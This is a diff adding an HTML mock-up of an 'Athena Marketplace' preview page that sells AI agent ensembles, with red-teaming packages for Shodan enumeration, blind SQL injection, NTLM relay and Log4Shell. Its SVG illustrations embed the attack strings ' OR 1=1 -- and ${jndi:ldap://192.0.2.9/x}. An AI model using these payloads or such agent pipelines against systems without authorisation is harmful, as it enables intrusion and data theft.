@@ -1,0 +1,857 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Athena Marketplace</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --bg:        #060d18;
+      --surface:   #0a1628;
+      --surface2:  #0d1e33;
+      --border:    #1a2d45;
+      --border2:   #243d5a;
+      --text:      #cbd5e1;
+      --muted:     #4a6280;
+      --dim:       #243347;
+      --orange:    #f97316;
+      --blue:      #3b82f6;
+      --green:     #22c55e;
+      --yellow:    #eab308;
+      --red:       #ef4444;
+      --nav-w:     248px;
+      --header-h:  56px;
+    }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'SF Mono', 'Fira Code', 'Fira Mono', 'Cascadia Code', monospace;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+    }
+
+    /* ── Header ── */
+    header {
+      height: var(--header-h);
+      flex-shrink: 0;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 28px;
+      border-bottom: 1px solid var(--border);
+      background: var(--surface);
+    }
+
+    .logo { display: flex; align-items: baseline; gap: 9px; }
+    .logo-name { font-size: 14px; font-weight: 700; letter-spacing: 3px; text-transform: uppercase; color: #e2e8f0; }
+    .logo-sep { color: var(--muted); }
+    .logo-sub { font-size: 10px; letter-spacing: 2px; text-transform: uppercase; color: var(--muted); }
+
+    .header-right { display: flex; align-items: center; gap: 14px; }
+    .header-tag {
+      font-size: 9px; font-weight: 700; letter-spacing: 1.5px; text-transform: uppercase;
+      padding: 3px 8px; border-radius: 3px;
+      background: rgba(249,115,22,0.1); color: var(--orange); border: 1px solid rgba(249,115,22,0.25);
+    }
+    .header-back {
+      font-size: 10px; letter-spacing: 1px; color: var(--muted);
+      text-decoration: none; border: 1px solid var(--border); border-radius: 3px;
+      padding: 4px 10px; transition: all 0.15s;
+    }
+    .header-back:hover { color: var(--text); border-color: var(--border2); }
+
+    /* ── Body ── */
+    .body { flex: 1; display: flex; overflow: hidden; }
+
+    /* ── Left nav ── */
+    nav {
+      width: var(--nav-w);
+      flex-shrink: 0;
+      border-right: 1px solid var(--border);
+      background: var(--surface);
+      overflow-y: auto;
+      padding: 20px 0 40px;
+    }
+
+    nav::-webkit-scrollbar { width: 3px; }
+    nav::-webkit-scrollbar-thumb { background: var(--border); border-radius: 2px; }
+
+    .nav-section { margin-bottom: 4px; }
+
+    /* top-level group headers */
+    .nav-group-header {
+      display: flex; align-items: center; gap: 6px;
+      padding: 8px 18px 6px;
+      cursor: pointer; user-select: none;
+    }
+    .nav-group-header:hover .nav-group-label { color: var(--text); }
+
+    .nav-arrow {
+      font-size: 8px; color: var(--muted);
+      transition: transform 0.15s; flex-shrink: 0; width: 10px;
+    }
+    .nav-arrow--open { transform: rotate(90deg); }
+
+    .nav-group-label {
+      font-size: 9px; font-weight: 700; letter-spacing: 2px;
+      text-transform: uppercase; color: var(--muted); transition: color 0.15s;
+    }
+    .nav-group-label--active { color: var(--text); }
+
+    /* top-level children container */
+    .nav-children { display: none; padding-bottom: 4px; }
+    .nav-children--open { display: block; }
+
+    /* level-1 items */
+    .nav-item {
+      display: flex; align-items: center; gap: 8px;
+      padding: 6px 18px 6px 34px;
+      font-size: 11px; color: var(--muted);
+      cursor: pointer; transition: color 0.12s, background 0.12s;
+      user-select: none; position: relative;
+    }
+    .nav-item:hover { color: var(--text); background: rgba(255,255,255,0.02); }
+    .nav-item--active { color: var(--text); background: rgba(249,115,22,0.06); }
+    .nav-item--active::before {
+      content: ''; position: absolute; left: 0; top: 0; bottom: 0;
+      width: 2px; background: var(--orange); border-radius: 0 1px 1px 0;
+    }
+
+    /* sub-group header (e.g. Cloud Providers inside Cybersecurity) */
+    .nav-subgroup-header {
+      display: flex; align-items: center; gap: 6px;
+      padding: 6px 18px 6px 34px;
+      cursor: pointer; user-select: none;
+    }
+    .nav-subgroup-header:hover .nav-subgroup-label { color: var(--text); }
+    .nav-subgroup-label {
+      font-size: 10px; font-weight: 600; letter-spacing: 0.5px;
+      color: var(--muted); transition: color 0.12s;
+    }
+    .nav-subgroup-label--active { color: var(--text); }
+
+    /* level-2 items (under a sub-group) */
+    .nav-subitems { display: none; }
+    .nav-subitems--open { display: block; }
+
+    .nav-subitem {
+      display: flex; align-items: center; gap: 8px;
+      padding: 5px 18px 5px 52px;
+      font-size: 10px; color: var(--muted);
+      cursor: pointer; transition: color 0.12s, background 0.12s;
+      user-select: none; position: relative;
+    }
+    .nav-subitem:hover { color: var(--text); background: rgba(255,255,255,0.02); }
+    .nav-subitem--active { color: var(--text); background: rgba(249,115,22,0.06); }
+    .nav-subitem--active::before {
+      content: ''; position: absolute; left: 0; top: 0; bottom: 0;
+      width: 2px; background: var(--orange); border-radius: 0 1px 1px 0;
+    }
+
+    .nav-dot {
+      width: 5px; height: 5px; border-radius: 50%;
+      background: var(--dim); flex-shrink: 0; transition: background 0.12s;
+    }
+    .nav-item--active .nav-dot,
+    .nav-subitem--active .nav-dot  { background: var(--orange); }
+    .nav-item:hover .nav-dot,
+    .nav-subitem:hover .nav-dot    { background: var(--border2); }
+
+    .nav-divider { height: 1px; background: var(--border); margin: 14px 18px; }
+
+    /* ── Main ── */
+    main { flex: 1; overflow-y: auto; padding: 28px 32px; }
+    main::-webkit-scrollbar { width: 4px; }
+    main::-webkit-scrollbar-thumb { background: var(--border); border-radius: 2px; }
+
+    .main-header { margin-bottom: 24px; }
+
+    .breadcrumb {
+      font-size: 9px; letter-spacing: 1.5px; text-transform: uppercase;
+      color: var(--muted); margin-bottom: 8px;
+    }
+    .breadcrumb span { color: var(--orange); }
+
+    .main-title { font-size: 18px; font-weight: 700; color: #e2e8f0; letter-spacing: 0.5px; margin-bottom: 6px; }
+    .main-desc  { font-size: 11px; color: var(--muted); line-height: 1.6; max-width: 560px; }
+
+    /* ── Ensemble explainer ── */
+    .explainer {
+      display: flex; align-items: center; gap: 10px;
+      padding: 10px 16px;
+      background: var(--surface2); border: 1px solid var(--border); border-radius: 5px;
+      margin-bottom: 24px; font-size: 10px; color: var(--muted);
+    }
+    .explainer-icon { font-size: 13px; flex-shrink: 0; }
+    .explainer strong { color: var(--text); }
+
+    /* ── Grid ── */
+    .grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }
+
+    /* ── Card ── */
+    .card {
+      background: var(--surface); border: 1px solid var(--border); border-radius: 6px;
+      overflow: hidden; display: flex; flex-direction: column;
+      transition: border-color 0.15s, box-shadow 0.15s; cursor: pointer;
+    }
+    .card:hover { border-color: var(--border2); box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
+
+    .card-thumb {
+      width: 100%; aspect-ratio: 16 / 9;
+      display: flex; align-items: center; justify-content: center;
+      flex-shrink: 0; background: var(--surface2);
+      position: relative; overflow: hidden;
+    }
+    .card-thumb img { width: 100%; height: 100%; object-fit: cover; display: block; }
+    .card-thumb-placeholder {
+      display: flex; align-items: center; justify-content: center;
+      width: 100%; height: 100%; font-size: 28px; letter-spacing: -2px;
+    }
+
+    .card-body { padding: 14px 16px; flex: 1; display: flex; flex-direction: column; gap: 8px; }
+
+    .card-tag {
+      font-size: 8px; font-weight: 700; letter-spacing: 1.5px; text-transform: uppercase;
+      padding: 2px 7px; border-radius: 2px; border: 1px solid; width: fit-content;
+    }
+    .card-name { font-size: 12px; font-weight: 700; color: #e2e8f0; line-height: 1.3; }
+    .card-desc { font-size: 10px; color: var(--muted); line-height: 1.6; flex: 1; }
+
+    .card-composition {
+      display: flex; gap: 10px;
+      padding-top: 10px; border-top: 1px solid var(--border); margin-top: 4px;
+    }
+    .comp-item { font-size: 9px; color: var(--muted); display: flex; flex-direction: column; gap: 2px; }
+    .comp-val  { font-size: 11px; font-weight: 700; color: var(--text); font-variant-numeric: tabular-nums; }
+
+    /* ── Empty state ── */
+    .empty-state {
+      display: none; flex-direction: column; align-items: center; justify-content: center;
+      gap: 14px; padding: 80px 40px; text-align: center; color: var(--muted);
+    }
+    .empty-state--visible { display: flex; }
+    .empty-icon  { font-size: 36px; opacity: 0.4; }
+    .empty-title { font-size: 14px; font-weight: 700; color: var(--dim); letter-spacing: 0.5px; }
+    .empty-desc  { font-size: 11px; line-height: 1.6; max-width: 360px; color: var(--muted); }
+    .empty-tag {
+      font-size: 9px; font-weight: 700; letter-spacing: 1.5px; text-transform: uppercase;
+      padding: 4px 12px; border-radius: 3px;
+      background: rgba(255,255,255,0.03); color: var(--dim); border: 1px solid var(--border);
+    }
+
+    /* ── Color helpers ── */
+    .c-orange { color: var(--orange); border-color: rgba(249,115,22,0.3); background: rgba(249,115,22,0.07); }
+    .c-blue   { color: var(--blue);   border-color: rgba(59,130,246,0.3);  background: rgba(59,130,246,0.07); }
+    .c-green  { color: var(--green);  border-color: rgba(34,197,94,0.3);   background: rgba(34,197,94,0.07);  }
+    .c-yellow { color: var(--yellow); border-color: rgba(234,179,8,0.3);   background: rgba(234,179,8,0.07);  }
+    .c-red    { color: var(--red);    border-color: rgba(239,68,68,0.3);   background: rgba(239,68,68,0.07);  }
+
+    .bg-orange { background: linear-gradient(135deg, #1a1208 0%, #2a1a08 100%); }
+    .bg-blue   { background: linear-gradient(135deg, #080e1a 0%, #0d1830 100%); }
+    .bg-green  { background: linear-gradient(135deg, #081408 0%, #0d2010 100%); }
+    .bg-red    { background: linear-gradient(135deg, #1a0808 0%, #2a0e0e 100%); }
+    .bg-yellow { background: linear-gradient(135deg, #1a1408 0%, #2a1e08 100%); }
+    .bg-purple { background: linear-gradient(135deg, #100818 0%, #1a1028 100%); }
+  </style>
+</head>
+<body>
+
+<header>
+  <div class="logo">
+    <span class="logo-name">Athena</span>
+    <span class="logo-sep">/</span>
+    <span class="logo-sub">Marketplace</span>
+  </div>
+  <div class="header-right">
+    <span class="header-tag">Preview</span>
+    <a href="javascript:window.close()" class="header-back">← Back to Athena</a>
+  </div>
+</header>
+
+<div class="body">
+
+  <!-- Left nav -->
+  <nav>
+
+    <!-- Industry Ensembles -->
+    <div class="nav-section">
+      <div class="nav-group-header" onclick="toggleGroup('industry')" id="gh-industry">
+        <span class="nav-arrow" id="arrow-industry">▶</span>
+        <span class="nav-group-label" id="gl-industry">Industry Ensembles</span>
+      </div>
+      <div class="nav-children" id="gc-industry">
+        <div class="nav-item" onclick="selectItem('automotive',    'Industry Ensembles', 'Automotive')"><span class="nav-dot"></span>Automotive</div>
+        <div class="nav-item" onclick="selectItem('life-sciences', 'Industry Ensembles', 'Life Sciences')"><span class="nav-dot"></span>Life Sciences</div>
+        <div class="nav-item" onclick="selectItem('warehousing',   'Industry Ensembles', 'Warehousing & Logistics')"><span class="nav-dot"></span>Warehousing & Logistics</div>
+        <div class="nav-item" onclick="selectItem('maritime',      'Industry Ensembles', 'Maritime & Ship Management')"><span class="nav-dot"></span>Maritime & Ship Management</div>
+        <div class="nav-item" onclick="selectItem('manufacturing', 'Industry Ensembles', 'Manufacturing')"><span class="nav-dot"></span>Manufacturing</div>
+        <div class="nav-item" onclick="selectItem('govt',          'Industry Ensembles', 'Govt & Public Services')"><span class="nav-dot"></span>Govt & Public Services</div>
+      </div>
+    </div>
+
+    <div class="nav-divider"></div>
+
+    <!-- Cybersecurity Ensembles -->
+    <div class="nav-section">
+      <div class="nav-group-header" onclick="toggleGroup('cyber')" id="gh-cyber">
+        <span class="nav-arrow nav-arrow--open" id="arrow-cyber">▶</span>
+        <span class="nav-group-label nav-group-label--active" id="gl-cyber">Cybersecurity Ensembles</span>
+      </div>
+      <div class="nav-children nav-children--open" id="gc-cyber">
+        <div class="nav-item" onclick="selectItem('iot',        'Cybersecurity Ensembles', 'IoT Security')"><span class="nav-dot"></span>IoT Security</div>
+        <div class="nav-item" onclick="selectItem('datacenter', 'Cybersecurity Ensembles', 'Data Center Security')"><span class="nav-dot"></span>Data Center Security</div>
+        <div class="nav-item" onclick="selectItem('medical-sec','Cybersecurity Ensembles', 'Medical Device Security')"><span class="nav-dot"></span>Medical Device Security</div>
+        <div class="nav-item" onclick="selectItem('homeauto',   'Cybersecurity Ensembles', 'Home Automation Security')"><span class="nav-dot"></span>Home Automation Security</div>
+
+        <!-- Cloud Providers sub-group -->
+        <div class="nav-subgroup-header" onclick="toggleSubGroup('cloud')" id="sgh-cloud">
+          <span class="nav-arrow" id="arrow-cloud">▶</span>
+          <span class="nav-subgroup-label" id="sgl-cloud">Cloud Providers</span>
+        </div>
+        <div class="nav-subitems" id="gsc-cloud">
+          <div class="nav-subitem" onclick="selectSubItem('cloud-aws',     'Cybersecurity Ensembles › Cloud Providers', 'AWS')"><span class="nav-dot"></span>AWS</div>
+          <div class="nav-subitem" onclick="selectSubItem('cloud-azure',   'Cybersecurity Ensembles › Cloud Providers', 'Azure')"><span class="nav-dot"></span>Azure</div>
+          <div class="nav-subitem" onclick="selectSubItem('cloud-alibaba', 'Cybersecurity Ensembles › Cloud Providers', 'Alibaba Cloud')"><span class="nav-dot"></span>Alibaba Cloud</div>
+          <div class="nav-subitem" onclick="selectSubItem('cloud-yandex',  'Cybersecurity Ensembles › Cloud Providers', 'Yandex Cloud')"><span class="nav-dot"></span>Yandex Cloud</div>
+        </div>
+
+        <div class="nav-item nav-item--active" onclick="selectItem('redteam', 'Cybersecurity Ensembles', 'Red Teaming')"><span class="nav-dot"></span>Red Teaming</div>
+      </div>
+    </div>
+
+    <div class="nav-divider"></div>
+
+    <!-- Assessments & Audits -->
+    <div class="nav-section">
+      <div class="nav-group-header" onclick="toggleGroup('audits')" id="gh-audits">
+        <span class="nav-arrow" id="arrow-audits">▶</span>
+        <span class="nav-group-label" id="gl-audits">Assessments & Audits</span>
+      </div>
+      <div class="nav-children" id="gc-audits">
+        <div class="nav-item" onclick="selectItem('pcidss',      'Assessments & Audits', 'PCI-DSS')"><span class="nav-dot"></span>PCI-DSS</div>
+        <div class="nav-item" onclick="selectItem('iso22301',    'Assessments & Audits', 'ISO-22301')"><span class="nav-dot"></span>ISO-22301</div>
+        <div class="nav-item" onclick="selectItem('iso27001',    'Assessments & Audits', 'ISO-27001')"><span class="nav-dot"></span>ISO-27001</div>
+        <div class="nav-item" onclick="selectItem('soc2',        'Assessments & Audits', 'SOC 2 Type II')"><span class="nav-dot"></span>SOC 2 Type II</div>
+        <div class="nav-item" onclick="selectItem('dora',        'Assessments & Audits', 'DORA')"><span class="nav-dot"></span>DORA</div>
+        <div class="nav-item" onclick="selectItem('nis2',        'Assessments & Audits', 'NIS2')"><span class="nav-dot"></span>NIS2</div>
+        <div class="nav-item" onclick="selectItem('nist-ai-rmf', 'Assessments & Audits', 'AI NIST RMF')"><span class="nav-dot"></span>AI NIST RMF</div>
+      </div>
+    </div>
+
+    <div class="nav-divider"></div>
+
+    <!-- Components -->
+    <div class="nav-section">
+      <div class="nav-group-header" onclick="toggleGroup('components')" id="gh-components">
+        <span class="nav-arrow" id="arrow-components">▶</span>
+        <span class="nav-group-label" id="gl-components">Components</span>
+      </div>
+      <div class="nav-children" id="gc-components">
+        <div class="nav-item" onclick="selectItem('agents-pkg',    'Components', 'Agents')"><span class="nav-dot"></span>Agents</div>
+        <div class="nav-item" onclick="selectItem('skills-pkg',    'Components', 'Skills & Tools')"><span class="nav-dot"></span>Skills & Tools</div>
+        <div class="nav-item" onclick="selectItem('knowledge-pkg', 'Components', 'Knowledge Bases')"><span class="nav-dot"></span>Knowledge Bases</div>
+      </div>
+    </div>
+
+  </nav>
+
+  <!-- Main content -->
+  <main>
+
+    <div class="main-header">
+      <div class="breadcrumb" id="breadcrumb">Marketplace <span>› Cybersecurity Ensembles › Red Teaming</span></div>
+      <div class="main-title" id="main-title">Red Teaming</div>
+      <div class="main-desc" id="main-desc">Complete agent ensembles for offensive security operations. Each package includes specialist agents, tool skills, and threat-intelligence knowledge bases — managed end-to-end by the Athena harness.</div>
+    </div>
+
+    <div class="explainer">
+      <span class="explainer-icon">🧩</span>
+      <span>An <strong>ensemble</strong> is a bundle of <strong>agents</strong>, <strong>skills</strong>, and <strong>knowledge bases</strong> that Athena's harness can spawn and orchestrate as a unified pipeline.</span>
+    </div>
+
+    <!-- Card grid -->
+    <div class="grid" id="card-grid">
+
+      <!-- Card 1: Shodan Sweep -->
+      <div class="card">
+        <div class="card-thumb">
+          <svg viewBox="0 0 320 180" xmlns="http://www.w3.org/2000/svg" style="width:100%;height:100%;display:block">
+            <defs>
+              <radialGradient id="rg1" cx="12%" cy="50%" r="88%">
+                <stop offset="0%" stop-color="#f97316" stop-opacity="0.12"/>
+                <stop offset="100%" stop-color="#060d18" stop-opacity="0"/>
+              </radialGradient>
+              <clipPath id="cc1"><rect x="40" y="0" width="290" height="180"/></clipPath>
+            </defs>
+            <rect width="320" height="180" fill="#060d18"/>
+            <rect width="320" height="180" fill="url(#rg1)"/>
+            <circle cx="40" cy="90" r="60"  fill="none" stroke="#f97316" stroke-width="0.7" opacity="0.5" clip-path="url(#cc1)"/>
+            <circle cx="40" cy="90" r="115" fill="none" stroke="#f97316" stroke-width="0.5" opacity="0.35" clip-path="url(#cc1)"/>
+            <circle cx="40" cy="90" r="180" fill="none" stroke="#f97316" stroke-width="0.4" opacity="0.2" clip-path="url(#cc1)"/>
+            <circle cx="40" cy="90" r="255" fill="none" stroke="#f97316" stroke-width="0.3" opacity="0.1" clip-path="url(#cc1)"/>
+            <line x1="40" y1="90" x2="320" y2="38"  stroke="#f97316" stroke-width="0.3" opacity="0.12"/>
+            <line x1="40" y1="90" x2="320" y2="90"  stroke="#f97316" stroke-width="0.3" opacity="0.12"/>
+            <line x1="40" y1="90" x2="320" y2="142" stroke="#f97316" stroke-width="0.3" opacity="0.12"/>
+            <circle cx="40" cy="90" r="3" fill="#f97316"/>
+            <circle cx="40" cy="90" r="7" fill="none" stroke="#f97316" stroke-width="1" opacity="0.4"/>
+            <circle cx="96"  cy="54"  r="3"   fill="#f97316" opacity="0.9"/>
+            <circle cx="150" cy="120" r="3"   fill="#f97316" opacity="0.75"/>
+            <circle cx="162" cy="36"  r="2.5" fill="#4a6280" opacity="0.7"/>
+            <circle cx="178" cy="144" r="2.5" fill="#f97316" opacity="0.6"/>
+            <circle cx="214" cy="70"  r="3"   fill="#f97316" opacity="0.85"/>
+            <circle cx="238" cy="132" r="2.5" fill="#4a6280" opacity="0.5"/>
+            <circle cx="272" cy="48"  r="2"   fill="#4a6280" opacity="0.4"/>
+            <circle cx="282" cy="114" r="3"   fill="#f97316" opacity="0.7"/>
+            <text x="102" y="50"  font-family="monospace" font-size="6.5" fill="#f97316" opacity="0.85">:22/SSH</text>
+            <text x="156" y="134" font-family="monospace" font-size="6.5" fill="#f97316" opacity="0.7">:80/HTTP</text>
+            <text x="220" y="65"  font-family="monospace" font-size="6.5" fill="#f97316" opacity="0.85">:443/TLS</text>
+            <text x="287" y="110" font-family="monospace" font-size="6.5" fill="#f97316" opacity="0.7">:3306</text>
+            <line x1="40" y1="90" x2="94"  y2="56"  stroke="#f97316" stroke-width="0.4" opacity="0.25"/>
+            <line x1="40" y1="90" x2="212" y2="71"  stroke="#f97316" stroke-width="0.3" opacity="0.2"/>
+            <line x1="40" y1="90" x2="280" y2="115" stroke="#f97316" stroke-width="0.3" opacity="0.15"/>
+          </svg>
+        </div>
+        <div class="card-body">
+          <span class="card-tag c-red">Red Teaming</span>
+          <div class="card-name">Shodan Sweep & Banner Grab</div>
+          <div class="card-desc">Internet exposure enumeration via the Shodan API — surfaces open ports, service banners, certificate metadata, and unintentional exposure across the target's declared IP space and ASN.</div>
+          <div class="card-composition">
+            <div class="comp-item"><span class="comp-val">6</span>Agent Elements</div>
+            <div class="comp-item"><span class="comp-val">14</span>Skills Granules</div>
+            <div class="comp-item"><span class="comp-val">3</span>Knowledge Granules</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Card 2: Blind SQLi -->
+      <div class="card">
+        <div class="card-thumb">
+          <svg viewBox="0 0 320 180" xmlns="http://www.w3.org/2000/svg" style="width:100%;height:100%;display:block">
+            <defs>
+              <marker id="s2ah" markerWidth="6" markerHeight="6" refX="5" refY="3" orient="auto">
+                <polygon points="0,0 6,3 0,6" fill="#ef4444"/>
+              </marker>
+              <marker id="s2ah2" markerWidth="6" markerHeight="6" refX="5" refY="3" orient="auto">
+                <polygon points="0,0 6,3 0,6" fill="#f97316"/>
+              </marker>
+            </defs>
+            <rect width="320" height="180" fill="#060d18"/>
+            <!-- DB cylinder -->
+            <ellipse cx="228" cy="72" rx="46" ry="11" fill="#0d1e33" stroke="#1a2d45" stroke-width="1"/>
+            <rect x="182" y="72" width="92" height="52" fill="#0a1628" stroke="#1a2d45" stroke-width="1"/>
+            <ellipse cx="228" cy="124" rx="46" ry="11" fill="#0a1628" stroke="#1a2d45" stroke-width="1"/>
+            <line x1="183" y1="86"  x2="273" y2="86"  stroke="#1a2d45" stroke-width="0.6"/>
+            <line x1="183" y1="100" x2="273" y2="100" stroke="#1a2d45" stroke-width="0.6"/>
+            <line x1="183" y1="114" x2="273" y2="114" stroke="#1a2d45" stroke-width="0.6"/>
+            <text x="190" y="95"  font-family="monospace" font-size="5.5" fill="#243d5a">id | email    | role</text>
+            <text x="190" y="109" font-family="monospace" font-size="5.5" fill="#243d5a">1  | admin@.. | su</text>
+            <text x="190" y="122" font-family="monospace" font-size="5.5" fill="#243d5a">2  | root@..  | su</text>
+            <!-- Injection payload -->
+            <rect x="16" y="78" width="135" height="19" rx="2" fill="#1a0808" stroke="#ef4444" stroke-width="0.9"/>
+            <text x="23" y="91" font-family="monospace" font-size="7.5" fill="#ef4444">' OR 1=1 --</text>
+            <!-- Arrow to DB -->
+            <line x1="151" y1="88" x2="180" y2="88" stroke="#ef4444" stroke-width="1.3" marker-end="url(#s2ah)"/>
+            <!-- Boolean branches -->
+            <text x="16" y="128" font-family="monospace" font-size="7" fill="#22c55e" opacity="0.75">&#x25B6; TRUE  → access</text>
+            <text x="16" y="143" font-family="monospace" font-size="7" fill="#4a6280" opacity="0.55">&#x25B6; FALSE → deny</text>
+            <!-- Exfil arrow -->
+            <line x1="274" y1="68" x2="310" y2="34" stroke="#f97316" stroke-width="1" stroke-dasharray="4,3" marker-end="url(#s2ah2)" opacity="0.7"/>
+            <text x="294" y="30" font-family="monospace" font-size="5.5" fill="#f97316" opacity="0.8">exfil</text>
+            <!-- Background watermark -->
+            <text x="16" y="170" font-family="monospace" font-size="28" fill="#0d1e33" opacity="0.6">SQL</text>
+          </svg>
+        </div>
+        <div class="card-body">
+          <span class="card-tag c-red">Red Teaming</span>
+          <div class="card-name">Blind SQLi Extraction Suite</div>
+          <div class="card-desc">Error-based, boolean-blind, and time-based SQL injection across authentication endpoints, search surfaces, and API parameters — extracts schema structure and column type inference with minimal request noise.</div>
+          <div class="card-composition">
+            <div class="comp-item"><span class="comp-val">5</span>Agent Elements</div>
+            <div class="comp-item"><span class="comp-val">18</span>Skills Granules</div>
+            <div class="comp-item"><span class="comp-val">2</span>Knowledge Granules</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Card 3: NTLM Relay -->
+      <div class="card">
+        <div class="card-thumb">
+          <svg viewBox="0 0 320 180" xmlns="http://www.w3.org/2000/svg" style="width:100%;height:100%;display:block">
+            <defs>
+              <marker id="s3fa" markerWidth="6" markerHeight="6" refX="5" refY="3" orient="auto">
+                <polygon points="0,0 6,3 0,6" fill="#3b82f6"/>
+              </marker>
+              <marker id="s3fa2" markerWidth="6" markerHeight="6" refX="5" refY="3" orient="auto">
+                <polygon points="0,0 6,3 0,6" fill="#ef4444"/>
+              </marker>
+              <marker id="s3fa3" markerWidth="6" markerHeight="6" refX="5" refY="3" orient="auto">
+                <polygon points="0,0 6,3 0,6" fill="#22c55e"/>
+              </marker>
+            </defs>
+            <rect width="320" height="180" fill="#060d18"/>
+            <!-- CLIENT -->
+            <rect x="10" y="52" width="76" height="54" rx="3" fill="#0d1e33" stroke="#1a2d45" stroke-width="1"/>
+            <rect x="10" y="52" width="76" height="9"  rx="3" fill="#1a2d45"/>
+            <rect x="16" y="65" width="64" height="34" rx="1" fill="#060d18" stroke="#243d5a" stroke-width="0.6"/>
+            <text x="48" y="85" font-family="monospace" font-size="6"   fill="#3b82f6" text-anchor="middle">NTLM auth</text>
+            <text x="48" y="94" font-family="monospace" font-size="5"   fill="#4a6280" text-anchor="middle">negotiate →</text>
+            <text x="48" y="119" font-family="monospace" font-size="6.5" fill="#cbd5e1" text-anchor="middle" font-weight="700">CLIENT</text>
+            <!-- RELAY / attacker -->
+            <rect x="120" y="40" width="80" height="60" rx="3" fill="#1a0808" stroke="#ef4444" stroke-width="1.5"/>
+            <rect x="120" y="40" width="80" height="9"  rx="3" fill="#2a0e0e"/>
+            <rect x="126" y="53" width="68" height="40" rx="1" fill="#060d18" stroke="#ef4444" stroke-width="0.8"/>
+            <text x="160" y="70"  font-family="monospace" font-size="6"   fill="#ef4444" text-anchor="middle">captures</text>
+            <text x="160" y="80"  font-family="monospace" font-size="6"   fill="#ef4444" text-anchor="middle">&amp; relays</text>
+            <text x="160" y="90"  font-family="monospace" font-size="5"   fill="#ef4444" text-anchor="middle" opacity="0.6">no creds needed</text>
+            <text x="160" y="116" font-family="monospace" font-size="6.5" fill="#ef4444" text-anchor="middle" font-weight="700">ATTACKER</text>
+            <!-- TARGET -->
+            <rect x="234" y="52" width="76" height="54" rx="3" fill="#0d1e33" stroke="#1a2d45" stroke-width="1"/>
+            <rect x="234" y="52" width="76" height="9"  rx="3" fill="#1a2d45"/>
+            <rect x="240" y="65" width="64" height="34" rx="1" fill="#060d18" stroke="#243d5a" stroke-width="0.6"/>
+            <text x="272" y="82" font-family="monospace" font-size="6"   fill="#22c55e" text-anchor="middle" opacity="0.9">auth OK</text>
+            <text x="272" y="92" font-family="monospace" font-size="5"   fill="#4a6280" text-anchor="middle">(relayed)</text>
+            <text x="272" y="119" font-family="monospace" font-size="6.5" fill="#cbd5e1" text-anchor="middle" font-weight="700">TARGET</text>
+            <!-- Flow arrows top (challenge) -->
+            <line x1="87"  y1="70" x2="118" y2="64" stroke="#3b82f6" stroke-width="1.1" marker-end="url(#s3fa)"/>
+            <line x1="201" y1="64" x2="232" y2="70" stroke="#ef4444" stroke-width="1.1" marker-end="url(#s3fa2)"/>
+            <!-- Flow arrows bottom (response) -->
+            <line x1="232" y1="82" x2="201" y2="88" stroke="#22c55e" stroke-width="0.9" stroke-dasharray="3,2" marker-end="url(#s3fa3)"/>
+            <line x1="118" y1="88" x2="87"  y2="82" stroke="#3b82f6" stroke-width="0.9" stroke-dasharray="3,2" marker-end="url(#s3fa)"/>
+            <!-- Labels -->
+            <text x="95"  y="62" font-family="monospace" font-size="5" fill="#3b82f6" opacity="0.8" text-anchor="middle">NTLM::</text>
+            <text x="222" y="62" font-family="monospace" font-size="5" fill="#ef4444" opacity="0.8" text-anchor="middle">relayed</text>
+            <!-- Protocol hint -->
+            <text x="108" y="160" font-family="monospace" font-size="8" fill="#1a2d45">SMB / HTTP / RPC</text>
+          </svg>
+        </div>
+        <div class="card-body">
+          <span class="card-tag c-red">Red Teaming</span>
+          <div class="card-name">NTLM Relay Chain</div>
+          <div class="card-desc">Captures and relays NTLM authentication over SMB, HTTP, and RPC — chained with coercion primitives to force authentication from high-value Windows targets without requiring credential material.</div>
+          <div class="card-composition">
+            <div class="comp-item"><span class="comp-val">4</span>Agent Elements</div>
+            <div class="comp-item"><span class="comp-val">9</span>Skills Granules</div>
+            <div class="comp-item"><span class="comp-val">2</span>Knowledge Granules</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Card 4: Log4Shell -->
+      <div class="card">
+        <div class="card-thumb">
+          <svg viewBox="0 0 320 180" xmlns="http://www.w3.org/2000/svg" style="width:100%;height:100%;display:block">
+            <defs>
+              <marker id="s4ca" markerWidth="6" markerHeight="6" refX="5" refY="3" orient="auto">
+                <polygon points="0,0 6,3 0,6" fill="#f97316"/>
+              </marker>
+            </defs>
+            <rect width="320" height="180" fill="#060d18"/>
+            <!-- Terminal window -->
+            <rect x="12" y="16" width="204" height="152" rx="4" fill="#0a1628" stroke="#1a2d45" stroke-width="1"/>
+            <rect x="12" y="16" width="204" height="13" rx="4" fill="#1a2d45"/>
+            <circle cx="21" cy="22.5" r="3" fill="#ef4444" opacity="0.6"/>
+            <circle cx="31" cy="22.5" r="3" fill="#f97316" opacity="0.6"/>
+            <circle cx="41" cy="22.5" r="3" fill="#22c55e" opacity="0.6"/>
+            <text x="114" y="26" font-family="monospace" font-size="5" fill="#4a6280" text-anchor="middle">application.log</text>
+            <!-- Normal log lines -->
+            <text x="18" y="43"  font-family="monospace" font-size="5.5" fill="#4a6280">INFO  08:11:58 GET /api/data 200</text>
+            <text x="18" y="55"  font-family="monospace" font-size="5.5" fill="#4a6280">INFO  08:12:01 GET /api/data 200</text>
+            <text x="18" y="67"  font-family="monospace" font-size="5.5" fill="#4a6280">WARN  08:12:04 slow response 843ms</text>
+            <!-- Malicious line highlight -->
+            <rect x="12" y="71" width="204" height="22" fill="#ef4444" opacity="0.07"/>
+            <rect x="12" y="71" width="3"   height="22" fill="#ef4444"/>
+            <text x="18" y="82"  font-family="monospace" font-size="5.5" fill="#ef4444">ERROR 08:12:07 User-Agent:</text>
+            <text x="18" y="91"  font-family="monospace" font-size="5.5" fill="#ef4444">  ${jndi:ldap://192.0.2.9/x}</text>
+            <!-- Normal lines continue -->
+            <text x="18" y="106" font-family="monospace" font-size="5.5" fill="#4a6280">INFO  08:12:10 GET /api/data 200</text>
+            <text x="18" y="118" font-family="monospace" font-size="5.5" fill="#4a6280">INFO  08:12:13 GET /health 200</text>
